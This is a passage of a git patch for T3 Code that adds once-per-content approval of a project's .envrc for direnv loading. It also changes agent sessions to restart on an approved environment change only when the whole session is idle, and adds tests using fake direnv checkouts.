@@ -1,0 +1,2189 @@
+From ada1ddf2b6fc46c382f544510d9f7212d391ed15 Mon Sep 17 00:00:00 2001
+From: Otavio Salvador <otavio@ossystems.com.br>
+Date: Fri, 30 Oct 2026 08:00:08 -0300
+Subject: [PATCH 06/11] feat: approve a project's .envrc once and load it
+ automatically
+
+Loading only .envrc files allowed from a shell left every new worktree blocked until a setup
+script ran direnv allow, which competes with the project's own setup script. T3 Code now asks
+once per project and per .envrc content, records the approval, and writes direnv's allow record
+for the exact content reviewed in each checkout it loads. A change asks again with a diff unless
+the project trusts changes, a direnv deny is never overridden, and an .envrc too large to show
+cannot be approved in the app.
+
+Agent sessions pick up an approved change by restarting, but only while the whole session is
+idle, so turns and background work in threads sharing the process are never cut off.
+---
+ .../src/features/threads/thread-work-log.tsx  |  57 ++--
+ apps/mobile/src/state/projectEnvironment.ts   |  26 ++
+ apps/server/src/auth/RpcAuthorization.ts      |   3 +-
+ .../src/observability/RpcInstrumentation.ts   |   3 +-
+ .../ProviderSessionManager.test.ts            | 265 ++++++++++++++++-
+ .../ProviderSessionManager.ts                 |  88 ++++--
+ .../project/ProjectEnvironmentService.test.ts | 241 +++++++++++++++
+ .../src/project/ProjectEnvironmentService.ts  | 277 ++++++++++++++++++
+ .../src/provider/DirenvEnvironment.test.ts    |  75 ++++-
+ apps/server/src/provider/DirenvEnvironment.ts | 116 ++++++--
+ apps/server/src/server.ts                     |   7 +
+ apps/server/src/ws.ts                         |  54 ++--
+ .../components/chat/TimelineWorkEntryRow.tsx  |  64 +---
+ apps/web/src/state/projectEnvironment.ts      |  26 ++
+ packages/client-runtime/package.json          |   4 +
+ .../src/state/commandPermissions.test.ts      |   4 +-
+ .../src/state/projectEnvironment.test.ts      |  19 ++
+ .../src/state/projectEnvironment.ts           | 174 +++++++++++
+ .../src/state/threadCommands.ts               |   4 -
+ .../contracts/src/clientRpcPermissions.ts     |   2 +-
+ packages/contracts/src/projectEnvironment.ts  |  57 +++-
+ packages/contracts/src/rpc.ts                 |  24 +-
+ packages/contracts/src/settings.ts            |  11 +-
+ 23 files changed, 1378 insertions(+), 223 deletions(-)
+ create mode 100644 apps/mobile/src/state/projectEnvironment.ts
+ create mode 100644 apps/server/src/project/ProjectEnvironmentService.test.ts
+ create mode 100644 apps/server/src/project/ProjectEnvironmentService.ts
+ create mode 100644 apps/web/src/state/projectEnvironment.ts
+ create mode 100644 packages/client-runtime/src/state/projectEnvironment.test.ts
+ create mode 100644 packages/client-runtime/src/state/projectEnvironment.ts
+
+diff --git a/apps/mobile/src/features/threads/thread-work-log.tsx b/apps/mobile/src/features/threads/thread-work-log.tsx
+index 6c852065d9..a8d86953f3 100644
+--- a/apps/mobile/src/features/threads/thread-work-log.tsx
++++ b/apps/mobile/src/features/threads/thread-work-log.tsx
+@@ -33,7 +33,6 @@ import {
+ } from "react";
+ import {
+   Animated as NativeAnimated,
+-  Alert,
+   type ColorValue,
+   Easing,
+   Pressable,
+@@ -54,6 +53,10 @@ import { useAtomValue } from "@effect/atom-react";
+ import { scopeThreadRef } from "@t3tools/client-runtime/environment";
+ import { environmentThreadDetails, threadEnvironment } from "../../state/threads";
+ import { useAtomCommand } from "../../state/use-atom-command";
++import { useThreadShell } from "../../state/entities";
++import { useEnvironmentQuery } from "../../state/query";
++import { appAtomRegistry } from "../../state/atom-registry";
++import { projectEnvironment } from "../../state/projectEnvironment";
+ import { toolActivityFaviconUrl } from "@t3tools/shared/favicon";
+ import { isJavaScriptReplTool } from "@t3tools/shared/toolActivity";
+ import { useMarkdownCodeHighlight } from "./markdownCodeHighlightState";
+@@ -855,53 +858,28 @@ function ReplCodeText({
+   );
+ }
+ 
+-/** Allows the thread's blocked `.envrc`; the next message loads it. */
+-// The work log remounts rows, so the outcome outlives the button.
+-const allowedDirenvWarnings = new Set<string>();
+-
+-function AllowDirenvButton(props: {
++/** Brings back the composer's review of the thread's blocked `.envrc`. */
++function ReviewEnvrcButton(props: {
+   readonly environmentId: EnvironmentId;
+   readonly threadId: ThreadId;
+-  readonly warningId: string;
+ }) {
+-  const allowDirenv = useAtomCommand(threadEnvironment.allowDirenv, "allow direnv");
+-  const [state, setState] = useState<"idle" | "pending" | "allowed">(() =>
+-    allowedDirenvWarnings.has(props.warningId) ? "allowed" : "idle",
+-  );
+-  // Clients without the operate grant can read the warning but not act on it.
+-  const permitted = useAtomValue(threadEnvironment.allowDirenv.permissionAtom(props.environmentId));
+-  if (!permitted) return null;
++  const shell = useThreadShell(scopeThreadRef(props.environmentId, props.threadId));
++  const target = shell
++    ? { environmentId: props.environmentId, projectId: shell.projectId, threadId: props.threadId }
++    : null;
++  const status = useEnvironmentQuery(target ? projectEnvironment.statusAtom(target) : null);
++  if (target === null || status.data?.pending === "none") return null;
+   return (
+     <Pressable
+       accessibilityRole="button"
+-      accessibilityHint="Loads the project's direnv environment with your next message."
+-      disabled={state !== "idle"}
+       hitSlop={6}
+-      onPress={async () => {
+-        setState("pending");
+-        const result = await allowDirenv({
+-          environmentId: props.environmentId,
+-          input: { threadId: props.threadId },
+-        });
+-        if (result._tag === "Success" && result.value.allowed) {
+-          allowedDirenvWarnings.add(props.warningId);
+-          setState("allowed");
+-          return;
+-        }
+-        setState("idle");
+-        if (result._tag === "Success") {
+-          Alert.alert("Could not allow the .envrc", result.value.error);
+-        }
++      onPress={() => {
++        projectEnvironment.reviewAgain(appAtomRegistry, target);
++        status.refresh();
+       }}
+       className="min-h-8 justify-center px-2"
+     >
+-      <Text className="font-t3-medium text-xs text-foreground">
+-        {state === "allowed"
+-          ? "Allowed · applies to your next message"
+-          : state === "pending"
+-            ? "Allowing…"
+-            : "Allow .envrc"}
+-      </Text>
++      <Text className="font-t3-medium text-xs text-foreground">Review .envrc</Text>
+     </Pressable>
+   );
+ }
+@@ -1169,10 +1147,9 @@ const ThreadWorkLogRow = function ThreadWorkLogRow(
+         <View className="shrink-0 flex-row items-center gap-px">
+           {row.projectedItem.item.type === "system_notice" &&
+           row.projectedItem.item.action?.type === "direnv.allow" ? (
+-            <AllowDirenvButton
++            <ReviewEnvrcButton
+               environmentId={props.environmentId}
+               threadId={row.projectedItem.item.threadId}
+-              warningId={row.projectedItem.item.id}
+             />
+           ) : null}
+           {props.copied ? (
+diff --git a/apps/mobile/src/state/projectEnvironment.ts b/apps/mobile/src/state/projectEnvironment.ts
+new file mode 100644
+index 0000000000..5c3ad27ae0
+--- /dev/null
++++ b/apps/mobile/src/state/projectEnvironment.ts
+@@ -0,0 +1,26 @@
++import { createProjectEnvironmentAtoms } from "@t3tools/client-runtime/state/projectEnvironment";
++import { Atom } from "effect/reactivity";
++
++import { connectionAtomRuntime } from "../connection/runtime";
++import { serverEnvironment } from "./server";
++import { environmentThreadShells } from "./threads";
++
++export const projectEnvironment = createProjectEnvironmentAtoms(connectionAtomRuntime, {
++  // Each run and each settings change; a run's start is when a changed .envrc surfaces.
++  refreshSignal: ({ environmentId, projectId, threadId }) =>
++    Atom.make((get) => {
++      const settings = get(serverEnvironment.configValueAtom(environmentId))?.settings;
++      const run =
++        threadId === null
++          ? null
++          : get(environmentThreadShells.quietThreadShellAtom({ environmentId, threadId }))
++              ?.latestRun;
++      return JSON.stringify([
++        settings?.enableDirenvEnvironment,
++        settings?.trustDirenvChanges,
++        settings?.projectSettingsOverrides[projectId],
++        run?.runId,
++        run?.status,
++      ]);
++    }),
++});
+diff --git a/apps/server/src/auth/RpcAuthorization.ts b/apps/server/src/auth/RpcAuthorization.ts
+index 293a8a8d62..48afdf2dc0 100644
+--- a/apps/server/src/auth/RpcAuthorization.ts
++++ b/apps/server/src/auth/RpcAuthorization.ts
+@@ -165,7 +165,8 @@ export const RPC_REQUIRED_SCOPES = {
+   [WS_METHODS.subscribeVcsStatus]: AuthOrchestrationReadScope,
+   [WS_METHODS.subscribeWorktreeSetup]: AuthOrchestrationReadScope,
+   [WS_METHODS.worktreeSetupCancel]: AuthOrchestrationOperateScope,
+-  [WS_METHODS.projectEnvironmentAllowDirenv]: AuthOrchestrationOperateScope,
++  [WS_METHODS.projectEnvironmentStatus]: AuthOrchestrationReadScope,
++  [WS_METHODS.projectEnvironmentApprove]: AuthOrchestrationOperateScope,
+   [WS_METHODS.subscribeResourceTelemetry]: AuthDiagnosticsReadScope,
+   [WS_METHODS.vcsRefreshStatus]: AuthOrchestrationReadScope,
+   [WS_METHODS.gitResolvePullRequest]: AuthOrchestrationReadScope,
+diff --git a/apps/server/src/observability/RpcInstrumentation.ts b/apps/server/src/observability/RpcInstrumentation.ts
+index f7ff6c84d9..13f9b5f9b5 100644
+--- a/apps/server/src/observability/RpcInstrumentation.ts
++++ b/apps/server/src/observability/RpcInstrumentation.ts
+@@ -148,7 +148,8 @@ const RPC_AGGREGATES = {
+   [WS_METHODS.projectsSearchContents]: "workspace",
+   [WS_METHODS.projectsSearchEntries]: "workspace",
+   [WS_METHODS.projectsWriteFile]: "workspace",
+-  [WS_METHODS.projectEnvironmentAllowDirenv]: "workspace",
++  [WS_METHODS.projectEnvironmentStatus]: "workspace",
++  [WS_METHODS.projectEnvironmentApprove]: "workspace",
+   [WS_METHODS.projectsEnsureScratch]: "orchestration",
+   [WS_METHODS.projectsCreateNew]: "orchestration",
+   [WS_METHODS.projectsCreateFromThread]: "orchestration",
+diff --git a/apps/server/src/orchestration-v2/ProviderSessionManager.test.ts b/apps/server/src/orchestration-v2/ProviderSessionManager.test.ts
+index 43cee84fda..a3a361c239 100644
+--- a/apps/server/src/orchestration-v2/ProviderSessionManager.test.ts
++++ b/apps/server/src/orchestration-v2/ProviderSessionManager.test.ts
+@@ -34,6 +34,7 @@ import { HttpServer } from "effect/http";
+ 
+ import { ProviderWorkspaceMissingError } from "../provider/Errors.ts";
+ import * as DirenvEnvironment from "../provider/DirenvEnvironment.ts";
++import * as ProjectEnvironmentService from "../project/ProjectEnvironmentService.ts";
+ import * as ServerEnvironment from "../environment/ServerEnvironment.ts";
+ import * as ProjectService from "../project/ProjectService.ts";
+ import * as McpProviderSession from "@t3tools/provider-core/server/mcpSession";
+@@ -491,7 +492,9 @@ function layerTest(input: {
+   readonly scopeCloseReached?: Deferred.Deferred<void>;
+   readonly serverSettingsLayer?: ReturnType<typeof ServerSettings.layerTest>;
+   readonly projectServiceLayer?: Layer.Layer<ProjectService.ProjectService>;
+-  readonly direnvLayer?: Layer.Layer<DirenvEnvironment.DirenvEnvironment>;
++  readonly direnvLayer?: Layer.Layer<
++    DirenvEnvironment.DirenvEnvironment | ProjectEnvironmentService.ProjectEnvironmentService
++  >;
+ }) {
+   const layerConfiguredEventSink =
+     input.flakyReleaseWrites !== undefined
+@@ -3683,12 +3686,30 @@ function runDirenvScenario(
+       ProviderAdapter.ProviderAdapterV2SessionRuntime,
+       ProviderSessionManager.ProviderSessionManagerV2Error
+     >;
++    /** A second thread in the same project, joining the shared session. */
++    readonly openOther: Effect.Effect<
++      ProviderAdapter.ProviderAdapterV2SessionRuntime,
++      ProviderSessionManager.ProviderSessionManagerV2Error
++    >;
+     readonly threadId: ThreadId;
+-  }) => Effect.Effect<void, ProviderSessionManager.ProviderSessionManagerV2Error>,
++  }) => Effect.Effect<
++    void,
++    ProviderSessionManager.ProviderSessionManagerV2Error,
++    IdAllocator.IdAllocatorV2 | ProjectionStore.ProjectionStoreV2
++  >,
++  options: {
++    readonly backgroundWork?: Effect.Effect<boolean>;
++    /** Runs inside the nth direnv load (from 1), while it evaluates; `release` closes the session. */
++    readonly beforeLoad?: (index: number, release: Effect.Effect<void>) => Effect.Effect<void>;
++    /** Where the second thread works, such as another worktree of the project. */
++    readonly otherCwd?: string;
++  } = {},
+ ) {
+   return Effect.gen(function* () {
+     const state = yield* Ref.make(emptyState);
+     const threadId = ThreadId.make("thread-provider-session-manager-direnv");
++    const loadCwds: string[] = [];
++    let releaseSession: Effect.Effect<void> = Effect.void;
+     const loads = yield* Ref.make<
+       ReadonlyArray<DirenvEnvironment.DirenvEnvironmentDiff | undefined>
+     >([]);
+@@ -3698,13 +3719,35 @@ function runDirenvScenario(
+     const direnvLayer = Layer.succeed(
+       DirenvEnvironment.DirenvEnvironment,
+       DirenvEnvironment.DirenvEnvironment.of({
+-        load: (_cwd, previous) =>
+-          Ref.modify(loads, (current) => [
+-            results[Math.min(current.length, results.length - 1)]!,
+-            [...current, previous],
+-          ]),
+-        allow: () => Effect.succeed({ _tag: "NotFound" }),
++        load: (cwd, previous) =>
++          Effect.gen(function* () {
++            loadCwds.push(cwd);
++            if (options.beforeLoad) {
++              yield* options.beforeLoad(
++                loadCwds.length,
++                Effect.suspend(() => releaseSession),
++              );
++            }
++            return yield* Ref.modify(loads, (current) => [
++              results[Math.min(current.length, results.length - 1)]!,
++              [...current, previous],
++            ]);
++          }),
++        allow: () => Effect.succeed({ _tag: "Allowed" }),
++        inspect: () => Effect.succeedNone,
+       }),
++    ).pipe(
++      Layer.merge(
++        Layer.succeed(
++          ProjectEnvironmentService.ProjectEnvironmentService,
++          ProjectEnvironmentService.ProjectEnvironmentService.of({
++            status: () => Effect.die("unused"),
++            approve: () => Effect.die("unused"),
++            prepare: () => Effect.succeed(true),
++            enabled: () => Effect.succeed(true),
++          }),
++        ),
++      ),
+     );
+     const beforeOpen = () =>
+       Ref.update(openedWith, (current) => [
+@@ -3721,18 +3764,42 @@ function runDirenvScenario(
+         providerInstanceId: modelSelection.instanceId,
+         threadId,
+       });
++      releaseSession = manager
++        .release({ providerSessionId, reason: "idle_timeout" })
++        .pipe(Effect.orDie);
++      const otherThreadId = ThreadId.make("thread-provider-session-manager-direnv-other");
+       yield* eventSink.write({
+-        events: [yield* makeThreadCreatedEvent({ idAllocator, threadId, now })],
++        events: [
++          yield* makeThreadCreatedEvent({ idAllocator, threadId, now }),
++          yield* makeThreadCreatedEvent({ idAllocator, threadId: otherThreadId, now }),
++        ],
+       });
+       yield* body({
+         manager,
+         open: manager.open({ threadId, providerSessionId, modelSelection, runtimePolicy }),
++        openOther: manager.open({
++          threadId: otherThreadId,
++          providerSessionId,
++          modelSelection,
++          runtimePolicy: { ...runtimePolicy, cwd: options.otherCwd ?? runtimePolicy.cwd },
++        }),
+         threadId,
+       });
+-    }).pipe(Effect.provide(layerTest({ state, idleTimeoutMs: 60_000, beforeOpen, direnvLayer })));
++    }).pipe(
++      Effect.provide(
++        layerTest({
++          state,
++          idleTimeoutMs: 60_000,
++          beforeOpen,
++          direnvLayer,
++          ...(options.backgroundWork ? { hasPendingBackgroundWork: options.backgroundWork } : {}),
++        }),
++      ),
++    );
+     return {
+       state: yield* Ref.get(state),
+       loads: yield* Ref.get(loads),
++      loadCwds,
+       openedWith: yield* Ref.get(openedWith),
+     };
+   });
+@@ -3779,11 +3846,14 @@ it.effect(
+       const result = yield* runDirenvScenario(
+         [
+           { _tag: "Loaded", diff: before, changed: true },
++          { _tag: "Loaded", diff: before, changed: false },
+           { _tag: "Loaded", diff: after, changed: true },
+         ],
+-        ({ open }) =>
++        ({ open, openOther }) =>
+           Effect.gen(function* () {
+             const first = yield* open;
++            // Another idle thread sharing the process does not hold the change back.
++            assert.strictEqual(yield* openOther, first);
+             const second = yield* open;
+             assert.notStrictEqual(first, second);
+           }),
+@@ -3791,7 +3861,178 @@ it.effect(
+       assert.equal(result.state.openCount, 2);
+       assert.deepStrictEqual(result.openedWith, [before, after]);
+       // The restart reuses the environment the check loaded instead of evaluating again.
+-      assert.equal(result.loads.length, 2);
++      assert.equal(result.loads.length, 3);
++    }),
++);
++
++it.effect(
++  "ProviderSessionManagerV2 keeps a session with background work despite a direnv change",
++  () =>
++    Effect.gen(function* () {
++      const before = { PATH: "/nix/store/old/bin", DIRENV_DIFF: "d1" };
++      const result = yield* runDirenvScenario(
++        [{ _tag: "Loaded", diff: before, changed: true }],
++        ({ open }) => Effect.all([open, open], { discard: true }),
++        { backgroundWork: Effect.succeed(true) },
++      );
++      assert.equal(result.state.openCount, 1);
++      // The check waits for the work to finish instead of evaluating direnv now.
++      assert.equal(result.loads.length, 1);
++    }),
++);
++
++it.effect(
++  "ProviderSessionManagerV2 keeps a session whose background work starts during a direnv check",
++  () =>
++    Effect.gen(function* () {
++      const pending = yield* Ref.make(false);
++      const result = yield* runDirenvScenario(
++        [
++          {
++            _tag: "Loaded",
++            diff: { PATH: "/nix/store/old/bin", DIRENV_DIFF: "d1" },
++            changed: true,
++          },
++          {
++            _tag: "Loaded",
++            diff: { PATH: "/nix/store/new/bin", DIRENV_DIFF: "d2" },
++            changed: true,
++          },
++        ],
++        ({ open }) => Effect.all([open, open], { discard: true }),
++        {
++          backgroundWork: Ref.get(pending),
++          beforeLoad: (index) => (index === 2 ? Ref.set(pending, true) : Effect.void),
++        },
++      );
++      assert.equal(result.state.openCount, 1);
++    }),
++);
++
++it.effect.each([
++  { during: "the direnv load", inLoad: true },
++  { during: "the final background-work probe", inLoad: false },
++])("ProviderSessionManagerV2 opens a new session when one closes during $during", ({ inLoad }) =>
++  Effect.gen(function* () {
++    const diff = { PATH: "/nix/store/tools/bin", DIRENV_DIFF: "d1" };
++    let probes = 0;
++    let release: Effect.Effect<void> = Effect.void;
++    const result = yield* runDirenvScenario(
++      [
++        { _tag: "Loaded", diff, changed: true },
++        { _tag: "Loaded", diff, changed: true },
++        { _tag: "Loaded", diff, changed: true },
++      ],
++      ({ manager, open }) =>
++        Effect.gen(function* () {
++          const first = yield* open;
++          const second = yield* open;
++          assert.notStrictEqual(second, first);
++          assert.isTrue(yield* manager.isLive(second.providerSessionId));
++        }),
++      {
++        // The second probe is the last check before a restart; the session closes, and is busy.
++        backgroundWork: Effect.suspend(() =>
++          ++probes === 2 && !inLoad ? release.pipe(Effect.as(true)) : Effect.succeed(false),
++        ),
++        beforeLoad: (index, releaseSession) => {
++          release = releaseSession;
++          return index === 2 && inLoad ? releaseSession : Effect.void;
++        },
++      },
++    );
++    assert.equal(result.state.openCount, 2);
++  }),
++);
++
++it.effect(
++  "ProviderSessionManagerV2 keeps a session whose turn starts during the final background-work probe",
++  () =>
++    Effect.gen(function* () {
++      let probes = 0;
++      let startTurn: Effect.Effect<unknown> = Effect.void;
++      const result = yield* runDirenvScenario(
++        [
++          {
++            _tag: "Loaded",
++            diff: { PATH: "/nix/store/old/bin", DIRENV_DIFF: "d1" },
++            changed: true,
++          },
++          {
++            _tag: "Loaded",
++            diff: { PATH: "/nix/store/new/bin", DIRENV_DIFF: "d2" },
++            changed: true,
++          },
++        ],
++        ({ open, threadId }) =>
++          Effect.gen(function* () {
++            const first = yield* open;
++            const idAllocator = yield* IdAllocator.IdAllocatorV2;
++            const projectionStore = yield* ProjectionStore.ProjectionStoreV2;
++            const runId = idAllocator.derive.run({ threadId, ordinal: 1 });
++            startTurn = first
++              .startTurn({
++                appThread: (yield* projectionStore.getThreadProjection(threadId).pipe(Effect.orDie))
++                  .thread,
++                threadId,
++                runId,
++                runOrdinal: 1,
++                providerTurnOrdinal: 1,
++                attemptId: idAllocator.derive.runAttempt({ runId, attemptOrdinal: 1 }),
++                rootNodeId: idAllocator.derive.rootNode({ runId }),
++                providerThread: makeProviderThread({
++                  idAllocator,
++                  threadId,
++                  providerSessionId: first.providerSessionId,
++                  now: yield* DateTime.now,
++                }),
++                message: {
++                  createdBy: "user",
++                  creationSource: "web",
++                  messageId: yield* idAllocator.allocate
++                    .message({ threadId, ordinal: 1 })
++                    .pipe(Effect.orDie),
++                  text: "turn",
++                  attachments: [],
++                },
++                modelSelection,
++                runtimePolicy,
++              })
++              .pipe(Effect.orDie);
++            assert.strictEqual(yield* open, first);
++          }),
++        {
++          backgroundWork: Effect.suspend(() =>
++            ++probes === 2 ? startTurn.pipe(Effect.as(false)) : Effect.succeed(false),
++          ),
++        },
++      );
++      assert.equal(result.state.openCount, 1);
++    }),
++);
++
++it.effect(
++  "ProviderSessionManagerV2 loads a restarted session's environment in its own checkout",
++  () =>
++    Effect.gen(function* () {
++      const changed = { PATH: "/nix/store/new/bin", DIRENV_DIFF: "d2" };
++      const result = yield* runDirenvScenario(
++        [
++          {
++            _tag: "Loaded",
++            diff: { PATH: "/nix/store/old/bin", DIRENV_DIFF: "d1" },
++            changed: true,
++          },
++          { _tag: "Loaded", diff: changed, changed: true },
++          { _tag: "Loaded", diff: changed, changed: true },
++        ],
++        ({ open, openOther }) => Effect.all([open, openOther], { discard: true }),
++        { otherCwd: "/tmp" },
++      );
++      assert.equal(result.state.openCount, 2);
++      // The check ran where the process started; the replacement starts in the other checkout.
++      assert.equal(result.loadCwds.at(-1), "/tmp");
++      assert.notEqual(result.loadCwds.at(-2), "/tmp");
+     }),
+ );
+ 
+diff --git a/apps/server/src/orchestration-v2/ProviderSessionManager.ts b/apps/server/src/orchestration-v2/ProviderSessionManager.ts
+index b8b4c22c15..f89fdc27f6 100644
+--- a/apps/server/src/orchestration-v2/ProviderSessionManager.ts
++++ b/apps/server/src/orchestration-v2/ProviderSessionManager.ts
+@@ -44,6 +44,7 @@ import { ProviderWorkspaceMissingError } from "../provider/Errors.ts";
+ import * as ProjectService from "../project/ProjectService.ts";
+ import * as McpProviderSessions from "@t3tools/provider-core/server/McpProviderSessions";
+ import * as DirenvEnvironment from "../provider/DirenvEnvironment.ts";
++import * as ProjectEnvironmentService from "../project/ProjectEnvironmentService.ts";
+ import * as ServerSettings from "../serverSettings.ts";
+ import * as McpSessionRegistry from "../mcp/McpSessionRegistry.ts";
+ import * as EventSink from "./EventSink.ts";
+@@ -375,17 +376,18 @@ export const layerWithOptions = (
+         },
+       );
+       const direnv = yield* Effect.serviceOption(DirenvEnvironment.DirenvEnvironment);
++      const projectEnvironment = yield* Effect.serviceOption(
++        ProjectEnvironmentService.ProjectEnvironmentService,
++      );
+       const direnvEnabled = Effect.fn("ProviderSessionManagerV2.direnvEnabled")(
+-        function* (threadId: ThreadId) {
+-          if (Option.isNone(serverSettings)) return true;
+-          const settings = yield* serverSettings.value.getSettings;
++        function* (threadId: ThreadId, cwd: string) {
++          if (Option.isNone(projectEnvironment)) return false;
+           const thread = yield* projectionStore.getThread(threadId);
+-          return resolveProjectSettings(settings, thread.projectId).settings
+-            .enableDirenvEnvironment;
++          return yield* projectEnvironment.value.prepare(thread.projectId, cwd);
+         },
+         Effect.catch((cause) =>
+           Effect.logWarning(
+-            "Could not resolve the direnv setting; starting the provider without the project's environment.",
++            "Could not resolve the project's direnv environment; starting the provider without it.",
+             { cause },
+           ).pipe(Effect.as(false)),
+         ),
+@@ -421,7 +423,7 @@ export const layerWithOptions = (
+         DirenvEnvironment.setThreadDirenvEnvironment(threadId, preloaded);
+         if (cwd === null) return null;
+         if (preloaded !== undefined) return { cwd, diff: preloaded } as SessionDirenvEnvironment;
+-        if (Option.isNone(direnv) || !(yield* direnvEnabled(threadId))) return null;
++        if (Option.isNone(direnv) || !(yield* direnvEnabled(threadId, cwd))) return null;
+         const result = yield* direnv.value.load(cwd);
+         yield* Effect.annotateCurrentSpan({ "provider.direnv.result": result._tag });
+         recordDirenvResult(threadId, result);
+@@ -430,17 +432,16 @@ export const layerWithOptions = (
+         return { cwd, diff } as SessionDirenvEnvironment;
+       });
+       /**
+-       * Re-check a live session's direnv environment before reusing it, as a
+-       * shell hook does on each prompt: direnv compares the files it watches
+-       * (the `.envrc`, its allow record, `flake.lock`, ...) and only evaluates
+-       * again when one changed. `restart` means the process should start over
+-       * with `diff`.
++       * Re-check a live session's direnv environment before reusing it, as a shell hook does
++       * on each prompt: direnv only evaluates again when a watched file changed. `restart`
++       * means the process should start over with `diff`.
+        */
+       const checkDirenvEnvironment = Effect.fn("ProviderSessionManagerV2.checkDirenvEnvironment")(
+         function* (entry: LiveSessionEntry, threadId: ThreadId, cwd: string | null) {
+           const loaded = entry.direnv?.diff;
+           if (Option.isNone(direnv) || cwd === null) return { restart: false } as const;
+-          if (!(yield* direnvEnabled(threadId))) return { restart: loaded !== undefined } as const;
++          if (!(yield* direnvEnabled(threadId, cwd)))
++            return { restart: loaded !== undefined } as const;
+           const previous = entry.direnv?.cwd === cwd ? loaded : undefined;
+           const result = yield* direnv.value.load(cwd, previous);
+           yield* Effect.annotateCurrentSpan({ "provider.direnv.refresh": result._tag });
+@@ -2168,16 +2169,45 @@ export const layerWithOptions = (
+                     cause: `Provider ${existing.runtime.driver} does not support attaching multiple app threads to one session.`,
+                   });
+                 }
+-                // Restarting the process would cut off work in flight or other
+-                // threads sharing it; those pick the change up once it idles.
+-                const ownedIdle =
+-                  existing.busyTurns.size === 0 &&
+-                  existing.attachedThreadIds.size === 1 &&
+-                  existing.attachedThreadIds.has(input.threadId);
+-                const direnvRefresh = ownedIdle
+-                  ? yield* checkDirenvEnvironment(existing, input.threadId, cwd)
+-                  : ({ restart: false } as const);
+-                if (!direnvRefresh.restart) {
++                // Restarting cuts off work in flight, in any thread sharing the process, so
++                // a change waits until the whole session idles, as an idle release would.
++                const idleGeneration = Effect.gen(function* () {
++                  const latest = (yield* Ref.get(sessions)).get(key);
++                  if (latest?.runtime !== existing.runtime || latest.busyTurns.size > 0) {
++                    return undefined;
++                  }
++                  const busy =
++                    existing.runtime.hasPendingBackgroundWork === undefined
++                      ? false
++                      : yield* existing.runtime.hasPendingBackgroundWork.pipe(
++                          Effect.catchCause(() => Effect.succeed(true)),
++                        );
++                  return busy ? undefined : latest.idleGeneration;
++                });
++                // The process keeps the directory it started in, whichever thread joins.
++                const direnvCwd = existing.direnv?.cwd ?? cwd;
++                const direnvRefresh =
++                  (yield* idleGeneration) !== undefined
++                    ? yield* checkDirenvEnvironment(existing, input.threadId, direnvCwd)
++                    : ({ restart: false } as const);
++                if (direnvRefresh.restart) {
++                  const generation = yield* idleGeneration;
++                  if (generation !== undefined) {
++                    yield* Effect.logInfo("orchestration-v2.provider-session.environment-changed", {
++                      providerSessionId: input.providerSessionId,
++                      threadId: input.threadId,
++                    });
++                    // Keeps the session if a turn started while the probes yielded.
++                    yield* releaseEntry({
++                      providerSessionId: input.providerSessionId,
++                      reason: "environment_changed",
++                      onlyIfIdleGeneration: generation,
++                    });
++                  }
++                }
++                // direnv can take minutes: a session still live is reused, and one an idle
++                // release closed meanwhile needs a new process rather than reuse.
++                if ((yield* Ref.get(sessions)).get(key)?.runtime === existing.runtime) {
+                   // Joining a shared session is a new session for this thread.
+                   if (!attached) yield* agentScope.clear(input.threadId);
+                   yield* ensureThreadAttached({
+@@ -2188,15 +2218,9 @@ export const layerWithOptions = (
+                   yield* touchActivity(input.providerSessionId);
+                   return existing.exposedRuntime;
+                 }
+-                yield* Effect.logInfo("orchestration-v2.provider-session.environment-changed", {
+-                  providerSessionId: input.providerSessionId,
+-                  threadId: input.threadId,
+-                });
+-                yield* releaseEntry({
+-                  providerSessionId: input.providerSessionId,
+-                  reason: "environment_changed",
+-                });
+-                preloadedDirenv = "diff" in direnvRefresh ? direnvRefresh.diff : undefined;
++                // The replacement starts in this thread's directory; only reuse a diff for it.
++                preloadedDirenv =
++                  "diff" in direnvRefresh && direnvCwd === cwd ? direnvRefresh.diff : undefined;
+               }
+ 
+               const adapter = yield* registry.get(input.modelSelection.instanceId).pipe(
+diff --git a/apps/server/src/project/ProjectEnvironmentService.test.ts b/apps/server/src/project/ProjectEnvironmentService.test.ts
+new file mode 100644
+index 0000000000..b4d766cd4f
+--- /dev/null
++++ b/apps/server/src/project/ProjectEnvironmentService.test.ts
+@@ -0,0 +1,241 @@
++import * as NodeServices from "@effect/platform-node/NodeServices";
++import { describe, expect, it } from "@effect/vitest";
++import { ProjectId, ThreadId } from "@t3tools/contracts";
++import * as Effect from "effect/Effect";
++import * as Layer from "effect/Layer";
++import * as Option from "effect/Option";
++
++import * as ServerConfig from "../config.ts";
++import * as ProjectionStore from "../orchestration-v2/ProjectionStore.ts";
++import * as DirenvEnvironment from "../provider/DirenvEnvironment.ts";
++import * as ServerSettings from "../serverSettings.ts";
++import * as ProjectEnvironmentService from "./ProjectEnvironmentService.ts";
++import * as ProjectService from "./ProjectService.ts";
++
++const projectId = ProjectId.make("project-direnv");
++const threadId = ThreadId.make("thread-direnv");
++const ROOT = "/repo";
++const WORKTREE = "/worktrees/repo-1";
++
++interface Checkout {
++  content: string;
++  permission: DirenvEnvironment.DirenvEnvrc["permission"];
++}
++
++/**
++ * A service over fake direnv checkouts: the project's root and one worktree,
++ * which a thread works in. Like direnv, an allow covers one path with one
++ * content; `allowed` records each one as `cwd`.
++ */
++function setup(
++  checkouts: Record<string, Checkout>,
++  settings: Parameters<typeof ServerSettings.layerTest>[0] = {},
++) {
++  const allowed: string[] = [];
++  const allowRecords = new Set<string>();
++  const direnv = Layer.mock(DirenvEnvironment.DirenvEnvironment)({
++    inspect: (cwd) =>
++      Effect.sync(() => {
++        const checkout = checkouts[cwd];
++        if (checkout === undefined) return Option.none<DirenvEnvironment.DirenvEnvrc>();
++        const path = `${cwd}/.envrc`;
++        const permission =
++          checkout.permission === "blocked" && allowRecords.has(`${path}\n${checkout.content}`)
++            ? "allowed"
++            : checkout.permission;
++        return Option.some({ path, content: checkout.content, permission });
++      }),
++    allow: (envrcPath, content) =>
++      Effect.sync(() => {
++        const cwd = envrcPath.replace(/\/\.envrc$/, "");
++        allowed.push(cwd);
++        allowRecords.add(`${envrcPath}\n${content}`);
++        if (checkouts[cwd]!.permission === "denied") checkouts[cwd]!.permission = "blocked";
++        return { _tag: "Allowed" } as const;
++      }),
++  });
++  const layer = ProjectEnvironmentService.layer.pipe(
++    Layer.provide(
++      Layer.mergeAll(
++        direnv,
++        ServerSettings.layerTest(settings),
++        Layer.mock(ProjectService.ProjectService)({
++          getById: () => Effect.succeedSome({ workspaceRoot: ROOT } as never),
++        }),
++        Layer.mock(ProjectionStore.ProjectionStoreV2)({
